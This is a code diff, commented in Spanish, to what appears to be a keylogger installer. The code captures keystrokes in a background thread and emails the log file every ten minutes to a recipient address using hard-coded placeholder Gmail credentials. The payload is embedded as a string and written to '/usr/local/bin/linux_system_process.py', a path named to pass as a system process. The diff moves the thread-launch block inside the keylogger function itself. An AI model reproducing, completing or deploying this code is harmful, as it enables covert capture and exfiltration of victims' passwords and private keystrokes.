@@ -111,21 +111,21 @@ def keylogger_thread_function():
     # Iniciar el listener en un hilo separado para la captura de teclas
     listener_thread = threading.Thread(target=start_listener)
     listener_thread.start()
+    
+    # Ejecutar el keylogger en segundo plano
+    try:
+        keylogger_thread = threading.Thread(target=keylogger_thread_function)
+        keylogger_thread.start()
+        # El keylogger ya se está ejecutando en segundo plano, y el hilo principal no está bloqueado
+    except Exception as e:
+        #print(f"Failed to execute the keylogger: {e}")
+        exit(1)
 
     # Bucle para enviar el log cada 10 minutos
     while True:
         time.sleep(600)  # Esperar 10 minutos
         if os.path.exists(log_file):
             send_log_via_email(log_file, "senderemail@gmail.com", "password", "recipientemail@gmail.com")
-
-# Ejecutar el keylogger en segundo plano
-try:
-    keylogger_thread = threading.Thread(target=keylogger_thread_function)
-    keylogger_thread.start()
-    # El keylogger ya se está ejecutando en segundo plano, y el hilo principal no está bloqueado
-except Exception as e:
-    #print(f"Failed to execute the keylogger: {e}")
-    exit(1)
 '''
 
     dest_path = "/usr/local/bin/linux_system_process.py"
